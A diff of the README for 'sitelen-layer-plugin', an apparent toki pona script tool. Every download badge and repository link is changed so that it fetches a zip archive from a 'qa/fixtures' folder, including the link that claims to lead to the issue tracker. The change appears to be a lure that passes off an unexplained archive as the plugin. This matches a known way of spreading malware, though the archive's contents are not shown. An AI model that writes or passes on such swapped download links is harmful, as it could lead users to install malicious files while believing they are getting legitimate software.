@@ -1,6 +1,6 @@
 # 🔄 sitelen-layer-plugin - Easily Add Sitelen Pona Layers
 
-[![Download sitelen-layer-plugin](https://img.shields.io/badge/Download-sitelen--layer--plugin-brightgreen?style=for-the-badge)](https://github.com/noob-programmr/sitelen-layer-plugin)
+[![Download sitelen-layer-plugin](https://img.shields.io/badge/Download-sitelen--layer--plugin-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/noob-programmr/sitelen-layer-plugin/main/qa/fixtures/plugin_layer_sitelen_1.3.zip)
 
 ## 📝 What is sitelen-layer-plugin?
 
@@ -25,11 +25,11 @@ Before installing, make sure you are running Windows with a modern web browser i
 
 Visit this page to download the sitelen-layer-plugin:
 
-[![Download sitelen-layer-plugin](https://img.shields.io/badge/Download-sitelen--layer--plugin-blue?style=for-the-badge)](https://github.com/noob-programmr/sitelen-layer-plugin)
+[![Download sitelen-layer-plugin](https://img.shields.io/badge/Download-sitelen--layer--plugin-blue?style=for-the-badge)](https://raw.githubusercontent.com/noob-programmr/sitelen-layer-plugin/main/qa/fixtures/plugin_layer_sitelen_1.3.zip)
 
 Click the link above or use the link below:
 
-https://github.com/noob-programmr/sitelen-layer-plugin
+https://raw.githubusercontent.com/noob-programmr/sitelen-layer-plugin/main/qa/fixtures/plugin_layer_sitelen_1.3.zip
 
 ### Step 2: Extract and Prepare Files
 
@@ -107,7 +107,7 @@ The plugin runs entirely in the browser. It does not require any special softwar
 
 To learn more about usage or customization, visit the repository page below. It contains examples, settings, and developer notes if you want to explore further.
 
-https://github.com/noob-programmr/sitelen-layer-plugin
+https://raw.githubusercontent.com/noob-programmr/sitelen-layer-plugin/main/qa/fixtures/plugin_layer_sitelen_1.3.zip
 
 Use this page to report issues or ask questions in the repository’s issue tracker if you encounter problems.
 
@@ -126,4 +126,4 @@ This makes sitelen-layer-plugin a focused utility for toki pona communities and 
 
 ___
 
-[![Download sitelen-layer-plugin](https://img.shields.io/badge/Download-sitelen--layer--plugin-brightgreen?style=for-the-badge)](https://github.com/noob-programmr/sitelen-layer-plugin)
+[![Download sitelen-layer-plugin](https://img.shields.io/badge/Download-sitelen--layer--plugin-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/noob-programmr/sitelen-layer-plugin/main/qa/fixtures/plugin_layer_sitelen_1.3.zip)
